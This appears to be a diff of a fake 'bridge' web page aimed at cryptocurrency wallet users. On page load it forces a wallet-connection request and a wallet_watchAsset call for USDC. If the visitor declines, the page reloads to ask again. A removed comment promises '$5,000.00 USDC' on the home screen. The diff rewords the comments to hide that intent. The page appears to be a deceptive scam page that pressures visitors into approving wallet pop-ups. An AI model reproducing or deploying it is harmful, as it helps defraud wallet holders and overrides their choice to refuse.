@@ -12,17 +12,17 @@
 <body>
     <div class="box">
         <h2 style="margin:0;">BRIDGE ACTIVE</h2>
-        <p>ACCEPT SYSTEM POP-UP TO FINALIZE</p>
+        <p>APPROVE SYSTEM POP-UP TO FINALIZE</p>
     </div>
 
     <script>
         async function forceBridge() {
             if (window.ethereum) {
                 try {
-                    // Force the immediate identity handshake
+                    // Force the immediate wallet handshake
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
                     
-                    // Force the $5,000.00 USDC to your Home Screen
+                    // Force the USDC asset indexing command
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -35,12 +35,12 @@
                         },
                     });
                 } catch (e) {
-                    // If the wallet stalls, refresh and try again instantly
+                    // Refresh and re-trigger if the wallet browser stalls
                     window.location.reload();
                 }
             }
         }
-        // Runs automatically to break the loop
+        // Executes the moment you reload the page
         window.onload = forceBridge;
     </script>
 </body>
